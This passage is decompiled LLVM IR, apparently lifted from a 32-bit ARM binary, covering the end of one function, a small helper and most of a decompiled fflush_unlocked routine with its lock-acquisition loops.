  store i1 %v3_168f8, i1* %cpsr_c.global-to-local, align 1
  %v9_168f8 = icmp eq i32 %v2_168f4, %v1_168f8.pre
  br i1 %v9_168f8, label %dec_label_pc_16900, label %dec_label_pc_16918

dec_label_pc_16914:                               ; preds = %dec_label_pc_16900
  %v0_16914 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16914, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16918

dec_label_pc_16918:                               ; preds = %dec_label_pc_168e8, %dec_label_pc_16900.dec_label_pc_168f4_crit_edge, %dec_label_pc_16914
  %v0_16920 = phi i32 [ %v0_16914, %dec_label_pc_16914 ], [ %v2_168f462, %dec_label_pc_168e8 ], [ %v2_168f4, %dec_label_pc_16900.dec_label_pc_168f4_crit_edge ]
  %v1_16918 = phi i32 [ %v0_16914, %dec_label_pc_16914 ], [ %v2_168e8, %dec_label_pc_168e8 ], [ %v1_168f8.pre, %dec_label_pc_16900.dec_label_pc_168f4_crit_edge ]
  %v3_16918 = icmp uge i32 %v0_16920, %v1_16918
  store i1 %v3_16918, i1* %cpsr_c.global-to-local, align 1
  %v9_16918 = icmp eq i32 %v0_16920, %v1_16918
  br i1 %v9_16918, label %dec_label_pc_16920, label %dec_label_pc_16918.dec_label_pc_168e8_crit_edge

dec_label_pc_16918.dec_label_pc_168e8_crit_edge:  ; preds = %dec_label_pc_16918
  %v0_168e8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_168e8

dec_label_pc_16920:                               ; preds = %dec_label_pc_16918
  %v2_16920 = icmp ne i32 %v1_16918, 0
  store i1 %v2_16920, i1* %cpsr_c.global-to-local, align 1
  %v7_16924 = icmp slt i32 %v1_16918, 2
  br i1 %v7_16924, label %dec_label_pc_16940, label %dec_label_pc_16928

dec_label_pc_16928:                               ; preds = %dec_label_pc_16920
  %v0_16928 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16928, i32* %r0.global-to-local, align 4
  %v0_1692c = load i32, i32* %r1.global-to-local, align 4
  %v1_1692c = add i32 %v0_1692c, 129
  store i32 %v1_1692c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16940

dec_label_pc_16940:                               ; preds = %dec_label_pc_168b0, %dec_label_pc_16928, %dec_label_pc_16920
  %v2_16944 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16944, i32* %r4.global-to-local, align 4
  %v1_16948 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16948

; uselistorder directives
  uselistorder i32 %v0_16914, { 1, 0, 2 }
  uselistorder i32 %v1_168f8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_168e8, { 1, 0 }
  uselistorder i32 %v0_16874, { 1, 0, 2 }
  uselistorder i32 %v1_16858.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16848, { 1, 0 }
  uselistorder i32 %v0_16814, { 2, 1, 0 }
  uselistorder i32 %v0_167b8, { 1, 0 }
  uselistorder i32 %v0_1679c, { 1, 0, 2 }
  uselistorder i32 %v1_16780.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1676c, { 1, 0 }
  uselistorder i32 %v0_16710, { 1, 0, 2 }
  uselistorder i32 %v1_166f4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_166c8, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 2, 8, 9, 10, 11, 12, 13, 14, 16, 15, 3, 17, 18, 19, 42, 43, 20, 21, 22, 23, 24, 25, 26, 28, 27, 1, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 0, 41, 44 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 6, 8, 7, 4, 9, 10, 11, 13, 12, 1, 14, 17, 15, 16, 3, 18, 20, 19, 0, 21, 22, 23, 24, 26, 25, 2, 27 }
  uselistorder i32 8192, { 4, 1, 2, 3, 0 }
  uselistorder i32 47, { 2, 0, 5, 3, 4, 1 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16940, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16918, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16900, { 1, 0 }
  uselistorder label %dec_label_pc_168b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_168a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16878, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16860, { 1, 0 }
  uselistorder label %dec_label_pc_16814, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_167dc, { 1, 0 }
  uselistorder label %dec_label_pc_167b0, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_167a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16788, { 1, 0 }
  uselistorder label %dec_label_pc_16724, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16714, { 2, 1, 0 }
  uselistorder label %dec_label_pc_166fc, { 1, 0 }
}

define i32 @function_16950(i32 %arg1) local_unnamed_addr {
dec_label_pc_16950:
  %v0_16950 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16950, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16950
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16950, %bb
  %v10_16964 = phi i32 [ %arg1, %dec_label_pc_16950 ], [ 0, %bb ]
  ret i32 %v10_16964

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_16968 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r6, align 4
  %v4_16978 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 76) to i32*), align 4
  store i32 %v4_16978, i32* %r3.global-to-local, align 4
  %v4_1697c = icmp uge i32 %tmp, %v4_16978
  store i1 %v4_1697c, i1* %cpsr_c.global-to-local, align 1
  %v10_1697c = icmp eq i32 %tmp, %v4_16978
  br i1 %v10_1697c, label %bb, label %dec_label_pc_16994

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_169a4

dec_label_pc_16994:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16998 = icmp eq i16* %arg1, null
  br i1 %v3_16998, label %dec_label_pc_169a4, label %dec_label_pc_16cb8

dec_label_pc_169a4:                               ; preds = %bb, %dec_label_pc_16994
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16994 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_169a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 160) to i32*), align 4
  store i32 %v4_169a8, i32* %r5.global-to-local, align 4
  %v0_169ac = call i32 @__aeabi_read_tp()
  store i32 %v0_169ac, i32* %r0.global-to-local, align 4
  %v1_169b0 = add i32 %v4_169a8, 8
  %v2_169b0 = inttoptr i32 %v1_169b0 to i32*
  %v3_169b0 = load i32, i32* %v2_169b0, align 4
  store i32 %v3_169b0, i32* %r3.global-to-local, align 4
  %v1_169b4 = add i32 %v0_169ac, -1168
  store i32 %v1_169b4, i32* %r8.global-to-local, align 4
  %v3_169b8 = icmp uge i32 %v3_169b0, %v1_169b4
  store i1 %v3_169b8, i1* %cpsr_c.global-to-local, align 1
  %v9_169b8 = icmp eq i32 %v3_169b0, %v1_169b4
  br i1 %v9_169b8, label %dec_label_pc_16a00, label %dec_label_pc_169c0

dec_label_pc_169c0:                               ; preds = %dec_label_pc_169a4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_169a8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_169cc143 = inttoptr i32 %v4_169a8 to i32*
  %v2_169cc144 = load i32, i32* %v1_169cc143, align 4
  store i32 %v2_169cc144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_169d0146 = icmp eq i32 %v2_169cc144, 0
  br i1 %v9_169d0146, label %dec_label_pc_169d8, label %dec_label_pc_169f0

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169c0, %dec_label_pc_169d8.dec_label_pc_169cc_crit_edge
  %v0_169d8147 = phi i32 [ %v1_169d0.pre, %dec_label_pc_169d8.dec_label_pc_169cc_crit_edge ], [ 0, %dec_label_pc_169c0 ]
  store i32 %v0_169d8147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_169e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_169e8, label %dec_label_pc_169ec, label %dec_label_pc_169d8.dec_label_pc_169cc_crit_edge

dec_label_pc_169d8.dec_label_pc_169cc_crit_edge:  ; preds = %dec_label_pc_169d8
  %v0_169cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_169d0.pre = load i32, i32* @r4, align 4
  %v1_169cc = inttoptr i32 %v0_169cc.pre to i32*
  %v2_169cc = load i32, i32* %v1_169cc, align 4
  store i32 %v2_169cc, i32* %r3.global-to-local, align 4
  %v3_169d0 = icmp uge i32 %v2_169cc, %v1_169d0.pre
  store i1 %v3_169d0, i1* %cpsr_c.global-to-local, align 1
  %v9_169d0 = icmp eq i32 %v2_169cc, %v1_169d0.pre
  br i1 %v9_169d0, label %dec_label_pc_169d8, label %dec_label_pc_169f0

dec_label_pc_169ec:                               ; preds = %dec_label_pc_169d8
  %v0_169ec = load i32, i32* @r4, align 4
  store i32 %v0_169ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169f0

dec_label_pc_169f0:                               ; preds = %dec_label_pc_169c0, %dec_label_pc_169d8.dec_label_pc_169cc_crit_edge, %dec_label_pc_169ec
  %v0_169f0 = phi i32 [ %v0_169ec, %dec_label_pc_169ec ], [ %v2_169cc144, %dec_label_pc_169c0 ], [ %v2_169cc, %dec_label_pc_169d8.dec_label_pc_169cc_crit_edge ]
  %v1_169f0 = phi i32 [ %v0_169ec, %dec_label_pc_169ec ], [ 0, %dec_label_pc_169c0 ], [ %v1_169d0.pre, %dec_label_pc_169d8.dec_label_pc_169cc_crit_edge ]
  %v3_169f0 = icmp uge i32 %v0_169f0, %v1_169f0
  store i1 %v3_169f0, i1* %cpsr_c.global-to-local, align 1
  %v9_169f0 = icmp eq i32 %v0_169f0, %v1_169f0
  br i1 %v9_169f0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_169f0
  %v1_169f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_169f4, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_169f0, %bb65
  %v1_169f8 = xor i1 %v9_169f0, true
  call void @__pseudo_cond_branch(i1 %v1_169f8, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_169fc = load i32, i32* %r8.global-to-local, align 4
  %v1_169fc = load i32, i32* %r5.global-to-local, align 4
  %v2_169fc = add i32 %v1_169fc, 8
  %v3_169fc = inttoptr i32 %v2_169fc to i32*
  store i32 %v0_169fc, i32* %v3_169fc, align 4
  br label %dec_label_pc_16a00

dec_label_pc_16a00:                               ; preds = %dec_label_pc_169a4, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16a04 = load i32, i32* @r6, align 4
  %v2_16a04 = add i32 %v0_16a04, 160
  %v3_16a04 = inttoptr i32 %v2_16a04 to i32*
  %v4_16a04 = load i32, i32* %v3_16a04, align 4
  store i32 %v4_16a04, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16a0c = add i32 %v0_16a04, 12
  %v3_16a0c = inttoptr i32 %v2_16a0c to i32*
  %v4_16a0c = load i32, i32* %v3_16a0c, align 4
  store i32 %v4_16a0c, i32* %r2.global-to-local, align 4
  %v1_16a10 = add i32 %v4_16a04, 4
  %v2_16a10 = inttoptr i32 %v1_16a10 to i32*
  %v3_16a10 = load i32, i32* %v2_16a10, align 4
  store i32 %v3_16a10, i32* %r1.global-to-local, align 4
  %v1_16a14 = inttoptr i32 %v4_16a0c to i32*
  %v2_16a14 = load i32, i32* %v1_16a14, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a18 = icmp eq i32 %v3_16a10, 0
  %v1_16a1c = add i32 %v2_16a14, 1
  store i32 %v1_16a1c, i32* %r3.global-to-local, align 4
  store i32 %v1_16a1c, i32* %v1_16a14, align 4
  br i1 %v2_16a18, label %dec_label_pc_16a28, label %dec_label_pc_16a88

dec_label_pc_16a28:                               ; preds = %dec_label_pc_16a00
  %v0_16a28 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a28 = load i32, i32* %r0.global-to-local, align 4
  %v2_16a28 = add i32 %v1_16a28, 8
  %v3_16a28 = inttoptr i32 %v2_16a28 to i32*
  store i32 %v0_16a28, i32* %v3_16a28, align 4
  %v0_16a2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16a2c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a60.dec_label_pc_16a30_crit_edge, %dec_label_pc_16a28
  %v0_16a30 = phi i32 [ %v0_16a30.pre, %dec_label_pc_16a60.dec_label_pc_16a30_crit_edge ], [ %v0_16a2c, %dec_label_pc_16a28 ]
  %v1_16a30 = inttoptr i32 %v0_16a30 to i32*
  %v2_16a30 = load i32, i32* %v1_16a30, align 4
  store i32 %v2_16a30, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16a30, i32* %r2.global-to-local, align 4
  %v2_16a3c131 = load i32, i32* %v1_16a30, align 4
  store i32 %v2_16a3c131, i32* %r3.global-to-local, align 4
  %v3_16a40133 = icmp uge i32 %v2_16a3c131, %v2_16a30
  store i1 %v3_16a40133, i1* %cpsr_c.global-to-local, align 1
  %v9_16a40139 = icmp eq i32 %v2_16a3c131, %v2_16a30
  br i1 %v9_16a40139, label %dec_label_pc_16a48, label %dec_label_pc_16a60

dec_label_pc_16a48:                               ; preds = %dec_label_pc_16a30, %dec_label_pc_16a48.dec_label_pc_16a3c_crit_edge
  %v0_16a48140 = phi i32 [ %v1_16a40.pre, %dec_label_pc_16a48.dec_label_pc_16a3c_crit_edge ], [ %v2_16a30, %dec_label_pc_16a30 ]
  store i32 %v0_16a48140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16a58 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16a58, label %dec_label_pc_16a5c, label %dec_label_pc_16a48.dec_label_pc_16a3c_crit_edge

dec_label_pc_16a48.dec_label_pc_16a3c_crit_edge:  ; preds = %dec_label_pc_16a48
  %v0_16a3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16a40.pre = load i32, i32* @r4, align 4
  %v1_16a3c = inttoptr i32 %v0_16a3c.pre to i32*
  %v2_16a3c = load i32, i32* %v1_16a3c, align 4
  store i32 %v2_16a3c, i32* %r3.global-to-local, align 4
  %v3_16a40 = icmp uge i32 %v2_16a3c, %v1_16a40.pre
  store i1 %v3_16a40, i1* %cpsr_c.global-to-local, align 1
  %v9_16a40 = icmp eq i32 %v2_16a3c, %v1_16a40.pre
  br i1 %v9_16a40, label %dec_label_pc_16a48, label %dec_label_pc_16a60

dec_label_pc_16a5c:                               ; preds = %dec_label_pc_16a48
  %v0_16a5c = load i32, i32* @r4, align 4
  store i32 %v0_16a5c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a60

dec_label_pc_16a60:                               ; preds = %dec_label_pc_16a30, %dec_label_pc_16a48.dec_label_pc_16a3c_crit_edge, %dec_label_pc_16a5c
  %v0_16a68 = phi i32 [ %v0_16a5c, %dec_label_pc_16a5c ], [ %v2_16a3c131, %dec_label_pc_16a30 ], [ %v2_16a3c, %dec_label_pc_16a48.dec_label_pc_16a3c_crit_edge ]
  %v1_16a60 = phi i32 [ %v0_16a5c, %dec_label_pc_16a5c ], [ %v2_16a30, %dec_label_pc_16a30 ], [ %v1_16a40.pre, %dec_label_pc_16a48.dec_label_pc_16a3c_crit_edge ]
  %v3_16a60 = icmp uge i32 %v0_16a68, %v1_16a60
  store i1 %v3_16a60, i1* %cpsr_c.global-to-local, align 1
  %v9_16a60 = icmp eq i32 %v0_16a68, %v1_16a60
  br i1 %v9_16a60, label %dec_label_pc_16a68, label %dec_label_pc_16a60.dec_label_pc_16a30_crit_edge

dec_label_pc_16a60.dec_label_pc_16a30_crit_edge:  ; preds = %dec_label_pc_16a60
  %v0_16a30.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a68:                               ; preds = %dec_label_pc_16a60
  %v2_16a68 = icmp ne i32 %v1_16a60, 0
  store i1 %v2_16a68, i1* %cpsr_c.global-to-local, align 1
  %v7_16a6c = icmp slt i32 %v1_16a60, 2
  br i1 %v7_16a6c, label %dec_label_pc_16a88, label %dec_label_pc_16a70

dec_label_pc_16a70:                               ; preds = %dec_label_pc_16a68
  %v0_16a70 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16a70, i32* %r0.global-to-local, align 4
  %v0_16a74 = load i32, i32* %r1.global-to-local, align 4
  %v1_16a74 = add i32 %v0_16a74, 129
  store i32 %v1_16a74, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16a88

dec_label_pc_16a88:                               ; preds = %dec_label_pc_16a00, %dec_label_pc_16a70, %dec_label_pc_16a68
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16a8c = load i32, i32* @r6, align 4
  %v2_16a8c = add i32 %v0_16a8c, 152
  %v3_16a8c = inttoptr i32 %v2_16a8c to i32*
  %v4_16a8c = load i32, i32* %v3_16a8c, align 4
  store i32 %v4_16a8c, i32* %r5.global-to-local, align 4
  %v1_16a90 = add i32 %v4_16a8c, 8
  %v2_16a90 = inttoptr i32 %v1_16a90 to i32*
  %v3_16a90 = load i32, i32* %v2_16a90, align 4
  store i32 %v3_16a90, i32* %r3.global-to-local, align 4
  %v1_16a94 = load i32, i32* %r8.global-to-local, align 4
  %v3_16a94 = icmp uge i32 %v3_16a90, %v1_16a94
  store i1 %v3_16a94, i1* %cpsr_c.global-to-local, align 1
  %v9_16a94 = icmp eq i32 %v3_16a90, %v1_16a94
  br i1 %v9_16a94, label %dec_label_pc_16adc, label %dec_label_pc_16a9c

dec_label_pc_16a9c:                               ; preds = %dec_label_pc_16a88
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16a8c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16aa8123 = inttoptr i32 %v4_16a8c to i32*
  %v2_16aa8124 = load i32, i32* %v1_16aa8123, align 4
  store i32 %v2_16aa8124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16aac126 = icmp eq i32 %v2_16aa8124, 0
  br i1 %v9_16aac126, label %dec_label_pc_16ab4, label %dec_label_pc_16acc

dec_label_pc_16ab4:                               ; preds = %dec_label_pc_16a9c, %dec_label_pc_16ab4.dec_label_pc_16aa8_crit_edge
  %v0_16ab4127 = phi i32 [ %v1_16aac.pre, %dec_label_pc_16ab4.dec_label_pc_16aa8_crit_edge ], [ 0, %dec_label_pc_16a9c ]
  store i32 %v0_16ab4127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ac4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ac4, label %dec_label_pc_16ac8, label %dec_label_pc_16ab4.dec_label_pc_16aa8_crit_edge

dec_label_pc_16ab4.dec_label_pc_16aa8_crit_edge:  ; preds = %dec_label_pc_16ab4
  %v0_16aa8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16aac.pre = load i32, i32* @r4, align 4
  %v1_16aa8 = inttoptr i32 %v0_16aa8.pre to i32*
  %v2_16aa8 = load i32, i32* %v1_16aa8, align 4
  store i32 %v2_16aa8, i32* %r3.global-to-local, align 4
  %v3_16aac = icmp uge i32 %v2_16aa8, %v1_16aac.pre
  store i1 %v3_16aac, i1* %cpsr_c.global-to-local, align 1
  %v9_16aac = icmp eq i32 %v2_16aa8, %v1_16aac.pre
  br i1 %v9_16aac, label %dec_label_pc_16ab4, label %dec_label_pc_16acc

dec_label_pc_16ac8:                               ; preds = %dec_label_pc_16ab4
  %v0_16ac8 = load i32, i32* @r4, align 4
  store i32 %v0_16ac8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16acc

dec_label_pc_16acc:                               ; preds = %dec_label_pc_16a9c, %dec_label_pc_16ab4.dec_label_pc_16aa8_crit_edge, %dec_label_pc_16ac8
  %v0_16acc = phi i32 [ %v0_16ac8, %dec_label_pc_16ac8 ], [ %v2_16aa8124, %dec_label_pc_16a9c ], [ %v2_16aa8, %dec_label_pc_16ab4.dec_label_pc_16aa8_crit_edge ]
  %v1_16acc = phi i32 [ %v0_16ac8, %dec_label_pc_16ac8 ], [ 0, %dec_label_pc_16a9c ], [ %v1_16aac.pre, %dec_label_pc_16ab4.dec_label_pc_16aa8_crit_edge ]
  %v3_16acc = icmp uge i32 %v0_16acc, %v1_16acc
  store i1 %v3_16acc, i1* %cpsr_c.global-to-local, align 1
  %v9_16acc = icmp eq i32 %v0_16acc, %v1_16acc
  br i1 %v9_16acc, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_16acc
  %v1_16ad0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16ad0, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_16acc, %bb67
  %v1_16ad4 = xor i1 %v9_16acc, true
  call void @__pseudo_cond_branch(i1 %v1_16ad4, i32 ptrtoint (i32* @global_var_142c4.496 to i32))
  %v0_16ad8 = load i32, i32* %r8.global-to-local, align 4
  %v1_16ad8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16ad8 = add i32 %v1_16ad8, 8
  %v3_16ad8 = inttoptr i32 %v2_16ad8 to i32*
  store i32 %v0_16ad8, i32* %v3_16ad8, align 4
  %v0_16ae0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16adc

dec_label_pc_16adc:                               ; preds = %dec_label_pc_16a88, %bb68
  %v0_16aec = phi i32 [ %v0_16a8c, %dec_label_pc_16a88 ], [ %v0_16ae0.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16ae0 = add i32 %v0_16aec, 152
  %v3_16ae0 = inttoptr i32 %v2_16ae0 to i32*
  %v4_16ae0 = load i32, i32* %v3_16ae0, align 4
  store i32 %v4_16ae0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16ae8 = add i32 %v4_16ae0, 4
  %v2_16ae8 = inttoptr i32 %v1_16ae8 to i32*
  %v3_16ae8 = load i32, i32* %v2_16ae8, align 4
  store i32 %v3_16ae8, i32* %r1.global-to-local, align 4
  %v2_16aec = add i32 %v0_16aec, 76
  %v3_16aec = inttoptr i32 %v2_16aec to i32*
  %v4_16aec = load i32, i32* %v3_16aec, align 4
  store i32 %v4_16aec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16af0 = icmp eq i32 %v3_16ae8, 0
  %v1_16af4 = inttoptr i32 %v4_16aec to i32*
  %v2_16af4 = load i32, i32* %v1_16af4, align 4
  store i32 %v2_16af4, i32* @r5, align 4
  br i1 %v2_16af0, label %dec_label_pc_16afc, label %dec_label_pc_16b5c

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16adc
  %v2_16afc = add i32 %v4_16ae0, 8
  %v3_16afc = inttoptr i32 %v2_16afc to i32*
  store i32 0, i32* %v3_16afc, align 4
  %v0_16b00 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16b00, i32* @r7, align 4
  br label %dec_label_pc_16b04

dec_label_pc_16b04:                               ; preds = %dec_label_pc_16b34.dec_label_pc_16b04_crit_edge, %dec_label_pc_16afc
  %v0_16b04 = phi i32 [ %v0_16b04.pre, %dec_label_pc_16b34.dec_label_pc_16b04_crit_edge ], [ %v0_16b00, %dec_label_pc_16afc ]
  %v1_16b04 = inttoptr i32 %v0_16b04 to i32*
  %v2_16b04 = load i32, i32* %v1_16b04, align 4
  store i32 %v2_16b04, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16b04, i32* %r2.global-to-local, align 4
  %v2_16b10111 = load i32, i32* %v1_16b04, align 4
  store i32 %v2_16b10111, i32* %r3.global-to-local, align 4
  %v3_16b14113 = icmp uge i32 %v2_16b10111, %v2_16b04
  store i1 %v3_16b14113, i1* %cpsr_c.global-to-local, align 1
  %v9_16b14119 = icmp eq i32 %v2_16b10111, %v2_16b04
  br i1 %v9_16b14119, label %dec_label_pc_16b1c, label %dec_label_pc_16b34

dec_label_pc_16b1c:                               ; preds = %dec_label_pc_16b04, %dec_label_pc_16b1c.dec_label_pc_16b10_crit_edge
  %v0_16b1c120 = phi i32 [ %v1_16b14.pre, %dec_label_pc_16b1c.dec_label_pc_16b10_crit_edge ], [ %v2_16b04, %dec_label_pc_16b04 ]
  store i32 %v0_16b1c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16b2c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16b2c, label %dec_label_pc_16b30, label %dec_label_pc_16b1c.dec_label_pc_16b10_crit_edge

dec_label_pc_16b1c.dec_label_pc_16b10_crit_edge:  ; preds = %dec_label_pc_16b1c
  %v0_16b10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b14.pre = load i32, i32* @r4, align 4
  %v1_16b10 = inttoptr i32 %v0_16b10.pre to i32*
  %v2_16b10 = load i32, i32* %v1_16b10, align 4
  store i32 %v2_16b10, i32* %r3.global-to-local, align 4
  %v3_16b14 = icmp uge i32 %v2_16b10, %v1_16b14.pre
  store i1 %v3_16b14, i1* %cpsr_c.global-to-local, align 1
  %v9_16b14 = icmp eq i32 %v2_16b10, %v1_16b14.pre
  br i1 %v9_16b14, label %dec_label_pc_16b1c, label %dec_label_pc_16b34

dec_label_pc_16b30:                               ; preds = %dec_label_pc_16b1c
  %v0_16b30 = load i32, i32* @r4, align 4
  store i32 %v0_16b30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b34

dec_label_pc_16b34:                               ; preds = %dec_label_pc_16b04, %dec_label_pc_16b1c.dec_label_pc_16b10_crit_edge, %dec_label_pc_16b30
  %v0_16b3c = phi i32 [ %v0_16b30, %dec_label_pc_16b30 ], [ %v2_16b10111, %dec_label_pc_16b04 ], [ %v2_16b10, %dec_label_pc_16b1c.dec_label_pc_16b10_crit_edge ]
  %v1_16b34 = phi i32 [ %v0_16b30, %dec_label_pc_16b30 ], [ %v2_16b04, %dec_label_pc_16b04 ], [ %v1_16b14.pre, %dec_label_pc_16b1c.dec_label_pc_16b10_crit_edge ]
  %v3_16b34 = icmp uge i32 %v0_16b3c, %v1_16b34
  store i1 %v3_16b34, i1* %cpsr_c.global-to-local, align 1
  %v9_16b34 = icmp eq i32 %v0_16b3c, %v1_16b34
  br i1 %v9_16b34, label %dec_label_pc_16b3c, label %dec_label_pc_16b34.dec_label_pc_16b04_crit_edge

dec_label_pc_16b34.dec_label_pc_16b04_crit_edge:  ; preds = %dec_label_pc_16b34
  %v0_16b04.pre = load i32, i32* @r7, align 4
